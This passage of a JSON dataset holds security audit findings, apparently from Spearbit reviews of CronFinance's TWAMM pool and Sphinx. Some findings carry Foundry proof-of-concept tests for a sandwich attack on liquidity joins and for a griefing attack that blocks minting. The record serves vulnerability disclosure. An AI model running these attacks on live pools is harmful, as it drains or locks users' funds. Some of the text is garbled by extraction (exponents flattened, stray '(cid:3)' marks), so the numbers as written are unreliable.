            "Severity: High Risk"
        ]
    },
    {
        "title": "Overpayment of one side of LP Pair onJoinPool due to sandwich or user error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Only one of the two incoming tokens are used to determine the amount of pool tokens minted (amountLP) on join amountLP = Math.min( _token0InU112.mul(supplyLP).divDown(_token0ReserveU112), _token1InU112.mul(supplyLP).divDown(_token1ReserveU112) ); In the event the price moves between the time a minter sends their transaction and when it is included in a block, they may overpay for one of _token0InU112 or _token1InU112. This can occur due to user error, or due to being sandwiched. Concrete example: pragma solidity ^0.7.0; pragma experimental ABIEncoderV2; import \"forge-std/Test.sol\"; import \"../HelperContract.sol\"; import { C } from \"../../Constants.sol\"; import { ExecVirtualOrdersMem } from \"../../Structs.sol\"; contract JoinSandwich is HelperContract { uint256 WAD = 10**18; function testManualJoinSandwich() public { 5 address userA = address(this); address userB = vm.addr(1323); // Add some base liquidity from the future attacker. addLiquidity(pool, userA, userA, 10**7 * WAD, 10**7 * WAD, 0); assertEq(CronV1Pool(pool).balanceOf(userA), 10**7 * WAD - C.MINIMUM_LIQUIDITY); // Give userB some tokens to LP with. token0.transfer(userB, 1_000_000 * WAD); token1.transfer(userB, 1_000_000 * WAD); addLiquidity(pool, userB, userB, 10**6 * WAD, 10**6 * WAD, 0); assertEq(CronV1Pool(pool).balanceOf(userB), 10**6 * WAD); exit(10**6 * WAD, ICronV1Pool.ExitType(0), pool, userB); assertEq(CronV1Pool(pool).balanceOf(userB), 0); // Full amounts are returned b/c the exit penalty has been removed (as is being done anyway). assertEq(token0.balanceOf(userB), 1_000_000 * WAD); assertEq(token1.balanceOf(userB), 1_000_000 * WAD); // Now we'll do the same thing, simulating a sandwich from userA. uint256 swapProceeds = swapPoolAddr(5 * 10**6 * WAD, /* unused */ 0, ICronV1Pool.SwapType(0), address(token0), pool, ,! userA); // Original tx from userB is sandwiched now... addLiquidity(pool, userB, userB, 10**6 * WAD, 10**6 * WAD, 0); // Sell back what was gained from the first swap. swapProceeds = swapPoolAddr(swapProceeds, /* unused */ 0, ICronV1Pool.SwapType(0), address(token1), pool, userA); emit log_named_uint(\"swapProceeds 1 to 0\", swapProceeds); // allows seeing what userA lost to fees // Let's see what poor userB gets back of their million token0 and million token1... assertEq(token0.balanceOf(userB), 0); assertEq(token1.balanceOf(userB), 0); exit(ICronV1Pool(pool).balanceOf(userB), ICronV1Pool.ExitType(0), pool, userB); emit log_named_uint(\"userB token0 after\", token0.balanceOf(userB)); emit log_named_uint(\"userB token1 after\", token1.balanceOf(userB)); } } Output: Logs: swapProceeds 1 to 0: 4845178856516554015932796 userB token0 after: 697176321467715374004199 userB token1 after: 687499999999999999999999 1. We have a pool where the attacker is all of the liquidity (107 of each token) 2. A LP tries to deposit another 106 in equal proportions 3. The attacker uses a swap of 5 (cid:3) 106 of one of the tokens to distort the pool. They lose about 155k in the process, but the LP loses far more, nearly all of which goes to the attacker--about 615,324 (sum of the losses of the two tokens since they're equally priced in this example). The attacker could be a significantly smaller proportion of the pool and still find this attack profitable. They could also JIT the liquidity since the early withdrawal penalty has been removed. The attack becomes infeasible for very large pools (has to happen over multiple TXs so can't flash loan --need own capital), but is relevant in practice.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Loss of Long-Term Swap Proceeds Likely in Pools With Decimal or Price Imbalances",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "This TWAMM implementation tracks the proceeds of long-term swaps efficiently via accumulated values called \"scaled proceeds\" for each token. In every order block interval (OBI), the scaled proceeds for e.g. the sale of token 0 are incremented by (quantity of token 1 purchased during the OBI) (cid:3)264= (sales rate of token 0 during the OBI) Then the proceeds of any specific long-term swap can be computed as the product of the difference between the scaled proceeds at the current block (or the expiration block of the order if filled) and the last block for which proceeds were claimed for the order and the order's sales rate, divided by 264: last := min(currentBlock, orderExpiryBlock) prev := block of last proceeds collection, or block order was placed in if this is the first withdrawal LT swap proceeds = (scaledProceedsl ast (cid:0) scaledProceedsprev ) (cid:3) (ordersalesrate)=264 The value 264 is referred to as the \"scaling factor\" and is intended to reduce precision loss in the division to determine the increment to the scaled proceeds. The addition to increment the scaled proceeds and the subtraction to compute its net change is both intentionally done with unchecked arithmetic--since only the difference matters, so long as at most one overflow occurs between claim-of-proceeds events for any given order, the computed proceeds will be correct (up to rounding errors). If two or more overflows occur, however, funds will be lost by the swapper (unclaimable and locked in the contract). Additionally, to cut down on gas costs, the scaled proceeds for the two tokens are packed into a single storage slot, so that only 128 bits are available for each value. This makes multiple overflows within the lifetime of a single order more likely. The CronFi team was aware of this at the start of the audit and specifically requested it be investigated, though they expected a maximum order length of 5 years to be sufficient to avoid the issue in practice. The scaling factor of 264 is approximately 1.8 (cid:3) 1019, close to the unit size of an 18-decimal token. It indeed works well if both pool tokens have similar decimals and relative prices that do not differ by too many orders of magnitude, as the quantity purchased and the sales rate will then be of similar magnitude, canceling to within a few powers of ten (2128 3.4 (cid:3) 1038, leaving around 19 orders of magnitude after accounting for the scaling factor). However, in pools with large disparities in price, decimals, or both, numerical issues are easy to encounter. The most extreme, realistic example would be a DAI-GUSD pool. DAI has 18 decimals while GUSD has only 2. We will treat the price of DAI and GUSD as equal for this analysis, as they are both stablecoins, and arbitrage of the TWAMM pool should prevent large deviations. Selling GUSD at a rate of 1000 per block, with an OBI of 64 (the stable pool order block interval in the audited commit) results in an increment of the scaled proceeds per OBI of: increment = (64 (cid:3) 1000 (cid:3) 1018) (cid:3) 264=(1000 (cid:3) 102) = 1.18 (cid:3) 1037 7 This will overflow an unsigned 128 bit integer after 29 OBIs; at 12 seconds per block, this means the first overflow occurs after 12 (cid:3) 64 (cid:3) 29 = 22272 seconds or about 6.2 hours, and thus the first double overflow (and hence irrevocable loss of proceeds if a withdrawal is not executed in time) will occur within about 12.4 hours (slightly but not meaningfully longer if the price is pushed a bit below 1:1, assuming a deep enough pool or reasonably efficient arbitrage). Since the TWAMM is intended to support swaps that take days, weeks, months, or even years to fill, without requiring constant vigilance from every long-term swapper, this is a strong violation of safety. A less extreme but more market-relevant example would be a DAI-WBTC pool. WBTC has 8 instead of 2 decimals, but it is also more than four orders of magnitude more valuable per token than DAI, making it only about 2 orders of magnitude \"safer\" than a DAI-GUSD pool. Imitating the above calculation with 20_000 DAI = 1 WBTC and selling 0.0025 WBTC (~$50) per block with a 257 block OBI yields: increment = (257 (cid:3) 50 (cid:3) 1018) (cid:3) 264=(0.0025 (cid:3) 108) = 9.48 (cid:3) 1035 OBI to overflow = ceiling(2128=(9.48 (cid:3) 1035)) = 359 time to overflow = 12 (cid:3) 257 (cid:3) 359 = 1107156 seconds = 307 hours = 12.8 days , or a little more than a day to encounter the second overflow. While less bad than the DAI-GUSD example, this is still likely of significant concern given that the CronFi team indicated these are parameters under which the TWAMM should be able to function safely and DAI-WBTC is a pair of interest for the v1 product. It is worth noting that these calculations are not directly dependent on the quantity being sold so long as the price stays roughly constant--any change in the selling rate will be compensated by a proportional change in the proceeds quantity as their ratio is determined by price. Thus the analysis depends only on relative price and relative decimals, to a good approximation--so a WBTC-DAI pool can be expected to experience an overflow roughly every two weeks at prevailing market prices, so long as the net selling rate is non-zero.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: High Risk"
        ]
    },
    {
        "title": "An attacker can block any address from joining the Pool and minting BLP Tokens by filling the joinEventMap mapping.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "An attacker can block any address from minting BLP Tokens. This occurs due to the MAX_JOIN_- EVENTS limit, which is present in the JoinEventLib library. The goal for an attacker is to block a legitimate user from minting BLP Tokens, by filling the joinEventMap mapping. The attacker can fill the joinEventMap mapping by performing the following steps:  The attacker mints BLP Tokens from 50 different addresses.  Each address transfers the BLP Tokens, alongside the join events, to the user targeted with a call to the CronV1Pool(pool).transfer and CronV1Pool(pool).transferJoinEvent functions respectively. Those transfers should happen in different blocks. After 50 blocks (50 * 12s = 10 minutes) the attacker has blocked the legitimate user from minting _BLP Tokens_, as the maximum size of the joinEventMap mapping has been reached. 8 The impact of this vulnerability can be significant, particularly for smart contracts that allow users to earn yield by providing liquidity in third-party protocols. For example, if a governance proposal is initiated to generate yield by providing liquidity in a CronV1Pool pool, the attacker could prevent the third-party protocol from integrating with the CronV1Pool protocol. A proof-of-concept exploit demonstrating this vulnerability can be found below: function testGriefingAttack() public { console.log(\"-----------------------------\"); console.log(\"Many Users mint BLP tokens and transfer the join events to the user 111 in order to fill the array!\"); ,! for (uint j = 1; j < 51; j++) { _addLiquidity(pool, address(j), address(j), 2_000, 2_000, 0); vm.warp(block.timestamp + 12); vm.startPrank(address(j)); //transfer the tokens CronV1Pool(pool).transfer(address(111), CronV1Pool(pool).balanceOf(address(j))); //transfer the join events to the address(111) CronV1Pool(pool).transferJoinEvent(address(111), 0 , CronV1Pool(pool).balanceOf(address(j))); vm.stopPrank(); } console.log(\"Balance of address(111) before minting LP Tokens himself\", ,! ICronV1Pool(pool).balanceOf(address(111))); //user(111) wants to enter the pool _addLiquidity(pool, address(111), address(111), 5_000, 5_000, 0); console.log(\"Join Events of user address(111): \", ICronV1Pool(pool).getJoinEvents(address(111)).length); console.log(\"Balance of address(111) after adding the liquidity: \", ICronV1Pool(pool).balanceOf(address(111))); ,! ,! }",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: High Risk"
        ]
    },
    {
        "title": "The executeVirtualOrdersToBlock function updates the oracle with the wrong block.number",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The executeVirtualOrdersToBlock is external, meaning anyone can call this function to execute virtual orders. The _maxBlock parameter can be lower block.number which will make the oracle malfunction as the oracle update function _updateOracle uses the block.timestamp and assumes that the update was called with the reserves at the current block. This will make the oracle update with an incorrect value when _maxBlock can be lower than block.number.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: High Risk"
        ]
    },
    {
        "title": "The _join function does not check if the recipient is address(0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "As stated within the Balancer's PoolBalances.sol // The Vault ignores the `recipient` in joins and the `sender` in exits: it is up to the Pool to keep track of ,! // their participation. The recipient is not checked if it's the address(0), that should happen within the pool implementation. Within the Cron implementation, this check is missing which can cause losses of LPs if the recipient is sent as address(0). This can have a high impact if a 3rd party integration happens with the Cron pool and the \"joiner\" is mistakenly sending an address(0). This becomes more dangerous if the 3rd party is a smart contract implementation that connects with the Cron pool, as the default value for an address is the address(0), so the probability of this issue occurring increases.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Canonical token pairs can be griefed by deploying new pools with malicious admins",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "function create( address _token0, address _token1, string memory _name, string memory _symbol, uint256 _poolType, address _pauser ) external returns (address) { CronV1Pool.PoolType poolType = CronV1Pool.PoolType(_poolType); requireErrCode(_token0 != _token1, CronErrors.IDENTICAL_TOKEN_ADDRESSES); (address token0, address token1) = _token0 < _token1 ? (_token0, _token1) : (_token1, _token0); requireErrCode(token0 != address(0), CronErrors.ZERO_TOKEN_ADDRESSES); requireErrCode(getPool[token0][token1][_poolType] == address(0), CronErrors.EXISTING_POOL); address pool = address( new CronV1Pool(IERC20(_token0), IERC20(_token1), getVault(), _name, _symbol, poolType, ,! address(this), _pauser) ); //... Anyone can permissionlessly deploy a pool, with it then becoming the canonical pool for that pair of tokens. An attacker is able to pass a malicious _pauser the twamm pool, preventing the creation of a legitimate pool of the same type and tokens. This results in race conditions between altruistic and malicious pool deployers to set the admin for every token pair. 10 Malicious actors may grief the protocol by attempting to deploy token pairs with and exploiting the admin address, either deploying the pool in a paused state, effectively disabling trading for long-term swaps with the pool, pausing the pool at an unknown point in the future, setting fee and holding penalty parameters to inappropriate values, or setting illegitimate arbitrage partners and lists. This requires the factory owner to remove the admin of each pool individually and to set a new admin address, fee parameters, holding periods, pause state, and arbitrage partners in order to recover each pool to a usable condition if the griefing is successful.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Refund Computation in _withdrawLongTermSwap Contains A Risky Underflow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Nothing prevents lastVirtualOrderBlock from advancing beyond the expiry of any given long-term swap, so the unchecked subtraction here is unsafe and can underflow. Since the resulting refund value will be extremely large due to the limited number of blocks that can elapse and the typical prices and decimals of tokens, the practical consequence will be a revert due to exceeding the pool and order balances. However, this could be used to steal funds if the value could be maliciously tuned, for example via another hypothetical bug that allowed the last virtual order block or the sales rate of an order to be manipulated to an arbitrary value.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Function transferJoinEvent Permits Transfer-to-Self",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Though the error code indicates the opposite intent, this check will permit transfer-to-self (|| used instead of &&).",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "One-step owner change for factory owner",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The factory owner can be changed with a single transaction. As the factory owner is critical to managing the pool fees and other settings an incorrect address being set as the owner may result in unintended behaviors.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Factory owner may front run large orders in order to extract fees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The factory owner may be able to front-run large trades in order to extract more fees if compromised or becomes malicious in one way or another. Similarly, pausing may also allow for skipping the execution of virtual orders before exiting.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Join Events must be explicitly transfered to recipient after transfering Balancer Pool Tokens in order to realize the full value of the tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Any user receiving LP tokens transferred to them must be explicitly transferred with a join event in order to redeem the full value of the LP tokens on exit, otherwise the address transferred to will automatically get the holding penalty when they try to exit the pool. Unless a protocol specifically implements transferJoinEvent function compatibility all LP tokens going through that protocol will be worth a fraction of their true value even after the holding period has elapsed.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Order Block Intervals(OBI) and Max Intervals are calculated with 14 second instead of 12 second block times",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The CronV1Pool contract calculates both the Order Block Intervals (OBI) and the Max Intervals of the Stable/Liquid/Volatile pairs with 14 second block times. However, after the merge, 12 second block time is enforced by the Beacon Chain.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "One-step status change for pool Admins",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Admin status can be changed in a single transaction. This may result in unintended behaviour if the incorrect address is passed.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Incomplete token simulation in CronV1Pool due to missing queryJoin and queryExit functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "he CronV1Pool contract is missing the queryJoin and queryExit functions, which are significant for calculating maxAmountsIn and/or minBptOut on pool joins, and minAmountsOut and/or maxBptIn on pool exits, respectively. The ability to calculate these values is very important in order to ensure proper enforcement of slippage tolerances and mitigate the risk of sandwich attacks.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A partner can trigger ROC update",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "A partner can trigger rook update if they return rook's current list within an update.  Scenario A partner calls updateArbitrageList, the IArbitrageurList(currentList).nextList() returns rook's rook- PartnerContractAddr and gets updated, the partner calls updateArbitrageList again, so this time isRook will be true.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Approved relayer can steal cron's fees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "A relayer within Balancer is set per vault per address. If feeAddr will ever add a relayer within the balancer vault, the relayer can call exitPool with a recipient of their choice, and the check on line 225 will pass as the sender will still be feeAddr but the true msg.sender is the relayer.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Price Path Due To Long-Term Orders Neglected In Oracle Updates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The _updateOracle() function takes its price sample as the final price after virtual order execution for whatever time period has elapsed since the last join/exit/swap. Since the price changes continuously during that interval if there are long-term orders active (unlike in Uniswap v2 where the price is constant between swaps), this is inaccurate - strictly speaking, one should integrate over the price curve as defined by LT orders to get a correct sample. The longer the interval, the greater the potential for inaccuracy.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Vulnerabilities noted from npm audit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "npm audit notes: 76 vulnerabilities (5 low, 16 moderate, 27 high, 28 critical).",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Optimization: Merge CronV1Pool.sol & VirtualOrders.sol (Changes from dev team added to audit.)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "A lot of needless parameter passing is done to accommodate the file barrier between CronV1Pool & VirtualOrdersLib, which is an internal library. Some parameters are actually immutable variables.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Receive sorted tokens at creation to reduce complexity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Currently, when a pool is created, within the constructor, logic is implemented to determine if the to- kens are sorted by address. A requirement that is needed for Balancer Pool creation. This logic adds unnecessary gas consumption and complexity throughout the contract as every time amounts are retrieved from balancer, the Cron Pool must check the order of the tokens and make sure that the difference between sorted (Balancer) and unsorted (Cron) token addresses is handled. An example can be seen in onJoinPool uint256 token0InU112 = amountsInU112[TOKEN0_IDX]; uint256 token1InU112 = amountsInU112[TOKEN1_IDX]; Where the amountsInU112 are retrieved from the balancer as a sorted array, index 0 == token0 and index 1 == token1, but on the Cron side, we must make sure that we retrieved the correct amount based on the tokens being sent as sorted or not when the pool was created.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Remove double reentrancy checks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "A number of CronV1Pool functions include reentrancy checks, however, they are only callable from a Balancer Vault function that already has a reentrancy check.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "TWAMM Formula Computation Can Be Made Correct-By-Construction and Optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The linked lines are the core calculation of TWAMM virtual order execution. They involve checked arithmetic in the form of underflow-checked subtractions; there is thus a theoretical risk that rounding error could lead to a \"freezing\" of a TWAMM pool. One of the subtractions, that for token1OutU112, is already \"correct-by- construction\", i.e. it can never underflow. The calculation of token0OutU112 can be reformulated to be explicitly safe as well; the following overall refactoring is suggested: uint256 ammEndToken0 = (token1ReserveU112 * sum0) / sum1; uint256 ammEndToken1 = (token0ReserveU112 * sum1) / sum0; token0ReserveU112 = ammEndToken0; token1ReserveU112 = ammEndToken1; token0OutU112 = sum0 - ammEndToken0; token1OutU112 = sum1 - ammEndToken1; Both output calculations are now of the form x (cid:0) (x (cid:3) y)=(y + z) for non-negative x, y , and z, allowing subtraction operations to be unchecked, which is both a gas optimization and gives confidence the calculation cannot freeze up unexpectedly due to an underflow. Replacement of divDown by / gives equivalent semantics with lower overhead. An additional advantage of this formulation is its manifest symmetry under 0 < (cid:0) > 1 interchange; this serves as a useful heuristic check on the computation, as it should possess the same symmetry as the invariant.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Gas Optimizations In Bit Packing Functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The bit packing operations are heavily used throughout the gas-critical swap code path, the opti- mization of which was flagged as high-priority by the CronFi team. Thus they were carefully reviewed not just for correctness, but also for gas optimization. L119: unnecessary & due to check on L116 L175: could hardcode clearMask L203: could hardcode clearMask L240: could hardcode clearMask L241: unnecessary & due to check on line 237 L242: unnecessary & due to check on line 238 L292: could hardcode clearMask L328: could hardcode clearMask L343: unnecessary to mask when _isWord0 == true L359: unnecessary & operations due to checks on lines 356 and 357 L372: unnecessary masking L389: could hardcode clearMask L390: unnecessary & due to check on L387 L415: could 16 hardcode clearMask L416: unnecessary & operation due to check on line 413 L437: unnecessary clearMask L438: unnecessary & due to check on line 435 L464: could hardcode clearMask L465: unnecessary & due to check on line 462 Additionally, the following code pattern appears in multiple places: requireErrCode(increment <= CONST, CronErrors.INCREMENT_TOO_LARGE); value += increment; requireErrCode(value <= CONST, CronErrors.OVERFLOW); Unless there's a particular reason to want to detect a too-large increment separately from an overflow, these patterns could all be simplified to requireErrCode(CONST - value >= increment, CronErrors.OVERFLOW); value += increment; as any increment greater than CONST will cause overflow anyway and value is always in the correct range by construction. This allows CronErrors.INCREMENT_TOO_LARGE to be removed as well.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Using extra storage slot to store two mappings of the same information",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "A second storage slot is used to store a duplicate mapping of the same token pair but in reverse order. If the tokens are sorted in a getter function then the second mapping does not need to be used.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Gas optimizations within _executeVirtualOrders function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Within the _executeVirtualOrders function there are a few gas optimizations that can be applied to reduce the contract size and gas consumed while the function is called. (!(virtualOrders.lastVirtualOrderBlock < _maxBlock && _maxBlock < block.number)) Is equivalent with: (virtualOrders.lastVirtualOrderBlock >= _maxBlock || _maxBlock >= block.number) This means that this always enters if _maxBlock == block.number which will result in unnecessary gas consump- tion. If cron fee is enabled, evoMem.feeShiftU3 will have a value meaning that the check on line 1536 is obsolete. Removing that check and the retrieve from storage will save gas.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Initializing with default value is consuming unnecessary gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Every variable declaration followed by initialization with a default value is gas consuming and obso- lete. The provided line within the context is just an example.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Factory requirement can be circumvented within the constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The constructor checks if the _factory parameter is the msg.sender. This behavior was, at first, created so that only the factory would be able to deploy pools. The check on line 484 is obsolete as pools deployed via the factory, will always have msg.sender == factory address, making the _factory parameter obsolete as well.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Usability: added remove, set pool functionality to CronV1PoolFactory (Changes from dev team added to audit.)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Conversations with the audit team indicated functions were needed to manage pool mappings post- creation in the event that a pool needed to be deprecated or replaced.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Informational"
        ]
    },
    {
        "title": "Virtual oracle getter--gets oracle value at block > lvob (Changes from dev team added to audit.)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Through the audit process, sufficient contract space became available to add an oracle getter con- venience that returns the oracle values and timestamps. However, this leaves the problem of not being able to get the oracle price at the current block in a pool with low volume but virtual orders active.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Informational"
        ]
    },
    {
        "title": "Loss of assets due to rounding during _longTermSwap",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "When a long term swap (LT) is created, the selling rate for that LT is set based on the amount and the number of blocks that order will be traded for. uint256 lastExpiryBlock = block.number - (block.number % ORDER_BLOCK_INTERVAL); uint256 orderExpiry = ORDER_BLOCK_INTERVAL * (_orderIntervals + 1) + lastExpiryBlock; // +1 protects from div 0 ,! uint256 tradeBlocks = orderExpiry - block.number; uint256 sellingRateU112 = _amountInU112 / tradeBlocks; During the computation of the number of blocks, the order must trade for, defined as tradeBlocks, the order expiry is computed from the last expiry block based on the OBI (Order Block Interval). If tradeBlocks is big enough (it can be a max of 176102 based on the STABLE_MAX_INTERVALS ), then sellingRa- teU112 will suffer a loss due to solidity rounding down behavior. This is a manageable loss for tokens with big decimals but for tokens with low decimals, will create quite an impact. E.g. wrapped BTC has 8 decimals. the MAX_ORDER_INTERVALS can be max 176102 as per stable max intervals defined within the constants. that being said a user can lose quite a significant value of BTC: 0.00176101 This issue is marked as Informational severity as the amount lost might not be that significant. This can change in the future if the token being LTed has a big value and a small number of decimals.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inaccuracies in Comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "A number of minor inaccuracies were discovered in comments that could impact the comprehensi- bility of the code to future maintainers, integrators, and extenders. [1] bit-0 should be bit-1 [2] less than should be at most [3] Maximally Extracted Value should be Maximal Extractable Value see flashbots.net [4] Maximally Extracted Value should be Maximal Extractable Value see flashbots.net [5] on these lines unsold should be sold [6] These comments are not applicable to the code block below them, as they mention looping but no looping is done; it seems they were copied over from the loop 19 on line 54. [7] These comments are not applicable to the code block below them, as they mention looping but no looping is done; it seems they were copied over from the loop on line 111. [8] omitted should be emitted",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unsupported SwapKind.GIVEN_OUT may limit the compatibility with Balancer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The Balancer protocol utilizes two types of swaps for its functionality - GIVEN_IN and GIVEN_OUT.  GIVEN_IN specifies the minimum amount of tokens a user would accept to receive from the swap.  GIVEN_OUT specifies the maximum amount of tokens a user would accept to send for the swap. However, the onSwap function of the CronV1Pool contract only accepts the IVault.SwapKind.GIVEN_IN value as the IVault.SwapKind field of the SwapRequest struct. The unsupported SwapKind.GIVEN_OUT may limit the compatibility with Balancer on the Batch Swaps and the Smart Order Router functionality, as a single SwapKind is given as an argument.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Informational"
        ]
    },
    {
        "title": "A pool's first LP will always take a minor loss on the value of their liquidity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The first liquidity provider for a pool will always take a small loss on the value of their tokens deposited into the pool because 1000 balancer pool tokens are minted to the zero address on the initial deposit. As most tokens have 18 decimal places, this value would be negligible in most cases, however, for tokens with a high value and small decimals the effects may be more apparent.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Informational"
        ]
    },
    {
        "title": "The _withdrawCronFees functions should revert if no fees to withdraw",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The _withdrawCronFees checks if there are any Cron Fees that need to be withdrawn, currently, this function does not revert in case there are no fees.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Informational"
        ]
    },
    {
        "title": "When SphinxModule is initialised the integrity of the used safe wallet is not checked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "When SphinxModule is initialised the integrity of the used safe wallet is not checked. Using an older or a newer safe wallet or a customised one can potentially cause funds to be locked/lost.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Check that networkDeploymentData.txs conforms to SphinxTransaction",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
